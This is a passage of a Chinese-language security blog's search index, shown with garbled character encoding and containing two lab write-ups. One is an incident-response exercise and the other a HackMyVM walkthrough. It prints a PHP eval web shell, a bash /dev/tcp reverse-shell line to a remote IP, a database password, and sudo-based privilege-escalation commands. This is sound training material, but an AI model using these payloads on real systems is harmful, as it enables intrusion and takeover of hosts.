<h4 id="æŸ¥çœ‹index-phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š"><a href="#æŸ¥çœ‹index-phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š" class="headerlink" title="æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š"></a>æŸ¥çœ‹index.phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>

<p><strong>wc -l</strong>ç”¨äºç»Ÿè®¡è¡Œæ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š"><a href="#æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š" class="headerlink" title="æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š"></a>æŸ¥çœ‹é»‘å®¢IPè®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š</h4><p>å’Œä¸Šä¸€é¢˜å·®ä¸å¤š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°"><a href="#æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°" class="headerlink" title="æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:"></a>æŸ¥çœ‹2023å¹´8æœˆ03æ—¥8æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘IPè®¿é—®ï¼Œæäº¤æ¬¡æ•°:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysqlæ—¥å¿—åˆ†æ"><a href="#mysqlæ—¥å¿—åˆ†æ" class="headerlink" title="mysqlæ—¥å¿—åˆ†æ"></a>mysqlæ—¥å¿—åˆ†æ</h3><h4 id="é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell-flag-å…³é”®å­—ç¬¦ä¸²"><a href="#é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell-flag-å…³é”®å­—ç¬¦ä¸²" class="headerlink" title="é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag{å…³é”®å­—ç¬¦ä¸²}"></a>é»‘å®¢ç¬¬ä¸€æ¬¡å†™å…¥çš„shell flag{å…³é”®å­—ç¬¦ä¸²}</h4><p>æ‰¾åˆ°sh.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢åå¼¹shellçš„ip-flag-ip"><a href="#é»‘å®¢åå¼¹shellçš„ip-flag-ip" class="headerlink" title="é»‘å®¢åå¼¹shellçš„ip flag{ip}"></a>é»‘å®¢åå¼¹shellçš„ip flag{ip}</h4><p>åœ¨æ—¥å¿—ä¸­å‘ç°adminer.phpä¸­å­˜åœ¨sqkæ³¨å…¥ï¼Œç”¨sys_evalå®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
<p>ä¸»è¦åœ¨&#x2F;tmp&#x2F;1.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„-md5-flag-md5-æ³¨-xxx-xxx-xxx-xxx-xxx-xx"><a href="#é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„-md5-flag-md5-æ³¨-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag{md5} æ³¨ &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>é»‘å®¢ææƒæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ md5 flag{md5} æ³¨ &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>å…ˆçŒœæµ‹æ˜¯udfææƒï¼Œåœ¨common.phpæ‰¾åˆ°æ•°æ®åº“è¿æ¥çš„è´¦å·å¯†ç </p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">è¿æ¥åˆ°æ•°æ®åº“</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">çœ‹ä¸€ä¸‹pluginè®¾ç½®çš„ç›®å½•</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
<p>æœ‰ä¸¤ä¸ªudf.so</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è·¯å¾„ï¼š/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>

<h4 id="é»‘å®¢è·å–çš„æƒé™-flag-whoamiåçš„å€¼"><a href="#é»‘å®¢è·å–çš„æƒé™-flag-whoamiåçš„å€¼" class="headerlink" title="é»‘å®¢è·å–çš„æƒé™ flag{whoamiåçš„å€¼}"></a>é»‘å®¢è·å–çš„æƒé™ flag{whoamiåçš„å€¼}</h4><p>udfææƒåæ‹¿åˆ°çš„æ˜¯mysqlæƒé™ï¼Œæ‰€ä»¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a class="link"   href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>åº”æ€¥å“åº”</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm first å¤ç›˜</title>
    <url>/2024/03/15/new/index/</url>
    <content><![CDATA[<h4 id="åŸºç¡€ä¿¡æ¯"><a href="#åŸºç¡€ä¿¡æ¯" class="headerlink" title="åŸºç¡€ä¿¡æ¯"></a>åŸºç¡€ä¿¡æ¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¶æœºip 192.168.64.75</span><br><span class="line">æ”»å‡»æœºip 192.168.64.3</span><br></pre></td></tr></table></figure>

<h4 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h4><p>æ‰«æåˆ°3ä¸ªç«¯å£ï¼Œ21ç«¯å£ï¼Œ22ç«¯å£å’Œ80ç«¯å£</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2020.08.29.png"   alt="d" style="zoom:40%;" >

<p>80ç«¯å£çœ‹ä¸åˆ°ä»€ä¹ˆå†…å®¹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.09.52.png" ></p>
<p>nmapæ‰«å‡ºæ¥ftpç«¯å£æœ‰å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œç™»é™†çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.64.75</span><br></pre></td></tr></table></figure>

<p>ç™»é™†è´¦å·å¯†ç éƒ½æ˜¯ftpå°±è¡Œï¼Œçœ‹æ¥çœ‹å»åªæœ‰firstæ–‡ä»¶å¤¹ä¸‹é¢æœ‰ä¸ªå›¾ç‰‡ã€‚ä¸‹è½½å‡ºæ¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.15.00.png" ></p>
<p>æ¥ç€å°±ä½¿ç”¨<strong>stegseek</strong>å·¥å…·åˆ†æä¸€ä¸‹ï¼Œè‡ªåŠ¨åˆ†æå‡ºä¸€ä¸ªsecret.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ stegseek first.jpg</span><br><span class="line">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</span><br><span class="line"></span><br><span class="line">[i] Found passphrase: &quot;firstgurl1&quot;</span><br><span class="line">[i] Original filename: &quot;secret.txt&quot;.</span><br><span class="line">[i] Extracting to &quot;first.jpg.out&quot;.</span><br><span class="line">the file &quot;first.jpg.out&quot; does already exist. overwrite ? (y/n)</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ cat secret.txt</span><br><span class="line">SGkgSSBoYWQgdG8gY2hhbmdlIHRoZSBuYW1lIG9mIHRoZSB0b2RvIGxpc3QgYmVjb3VzZSBkaXJlY3RvcnkgYnVzdGluZyBpcyB0b28gZWFzeSB0aGVlc2UgZGF5cyBhbHNvIEkgZW5jb2RlZCB0aGlzIGluIGJlc2E2NCBiZWNvdXNlIGl0IGlzIGNvb2wgYnR3IHlvdXIgdG9kbyBsaXN0IGlzIDogMmYgNzQgMzAgNjQgMzAgNWYgNmMgMzEgNzMgNzQgNWYgNjYgMzAgNzIgNWYgNjYgMzEgNzIgMzUgNzQgZG8gaXQgcXVpY2sgd2UgYXJlIHZ1bG5hcmFibGUgZG8gdGhlIGZpcnN0IGZpcnN0IA==</span><br></pre></td></tr></table></figure>

<p>secret.txté‡Œé¢æ˜¯ä¸²base64å­—ç¬¦ï¼Œè§£å¯†ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ cat secret.txt| base64 -d</span><br><span class="line">Hi I had to change the name of the todo list becouse directory busting is too easy theese days also I encoded this in besa64 becouse it is cool btw your todo list is : 2f 74 30 64 30 5f 6c 31 73 74 5f 66 30 72 5f 66 31 72 35 74 do it quick we are vulnarable do the first first</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„çœ‹ä¸­é—´æœ‰ä¸€ä¸²åå…­æœºåˆ¶æ•°å­—ï¼Œå†è§£å¯†ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€ä¸ªç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.23.png" ></p>
<h4 id="ç¬¬ä¸€ä¸ªshell"><a href="#ç¬¬ä¸€ä¸ªshell" class="headerlink" title="ç¬¬ä¸€ä¸ªshell"></a>ç¬¬ä¸€ä¸ªshell</h4><p>æ³¨æ„åˆ°ç¬¬äºŒç‚¹æåˆ°æœ‰upload.phpï¼Œæ‰«ä¸€ä¸‹ç›®å½•è¯•è¯•</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.19.57.png" ></p>
<p>æ‰«åˆ°ä¸€ä¸ªuploadsç›®å½•å’Œä¸€ä¸ªupload.php</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.21.33.png" ></p>
<p>å¯ä»¥å‘ç°æ–‡ä»¶ä¸Šä¼ æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œé‚£ç›´æ¥ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.22.48.png" ></p>
<p>èšå‰‘è¿æ¥</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.27.44.png" ></p>
<p>æ¥ä¸‹æ¥æˆ‘åœ¨ç›®å½•ä¸Šä¼ ä¸€ä¸ªåé—¨phpï¼Œkaliå¼€å¯ç›‘å¬ï¼Œåœ¨èšå‰‘è™šæ‹Ÿç»ˆç«¯ä¸­ç”¨phpï¼Œå³å¯æ‹¿åˆ°www-dataçš„shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.31.02.png" ></p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><p>sudo -læŸ¥åˆ°æœ‰neofetchå¯ä»¥åˆ©ç”¨ï¼Œ<a class="link"   href="https://gtfobins.github.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F" >https://gtfobins.github.io/åœ¨è¿™ä¸ªç½‘ç«™æŸ¥è¯¢åˆ°ææƒæ–¹å¼<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.39.02.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.38.30.png" ></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@first:/tmp$ echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">echo &#x27;exec /bin/sh&#x27; &gt; a.sh</span><br><span class="line">www-data@first:/tmp$ ls</span><br><span class="line">ls</span><br><span class="line">a.sh</span><br><span class="line">www-data@first:/tmp$ sudo -u first neofetch --config a.sh</span><br><span class="line">sudo -u first neofetch --config a.sh</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(first) gid=1000(first) groups=1000(first),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸæ‹¿åˆ°firståˆ°shell</p>
<p>å†æ¬¡sudo -lï¼Œå‘ç°æœ‰ä¸ªsecretï¼ŒfileæŸ¥çœ‹å‘ç°æ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.43.22.png" ></p>
<p>ä¸‹è½½åˆ°æœ¬åœ°ç”¨idaåˆ†æä¸€ä¸‹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.45.15.png" ></p>
<p>å­¦ä¹ åˆ«çš„wpæŒ‡å¯¼è¿™é‡Œæœ‰ä¸ªæ ˆæº¢å‡ºï¼ˆè¿™å—åœ°æ–¹æœ‰å¾…å­¦ä¹ ï¼‰ï¼Œè¾“å…¥è¶…è¿‡10ä¸ªå­—ç¬¦ä¸²å°±ä¼šæ‰§è¡Œæˆ‘ä»¬çš„commandï¼Œ<strong>æ€è·¯å°±æ˜¯sudoè°ƒç”¨ï¼Œç„¶åç»™ä¸€ä¸ª&#x2F;bin&#x2F;bash</strong>å°±æ‹¿åˆ°rootåˆ°æƒé™äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-15%2021.47.23.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>å›¾ç‰‡éšå†™åˆ†æï¼Œææƒå‘½ä»¤åˆ©ç”¨ï¼Œæ ˆæº¢å‡ºçš„åˆ©ç”¨ã€‚</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>blog</tag>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
</search>
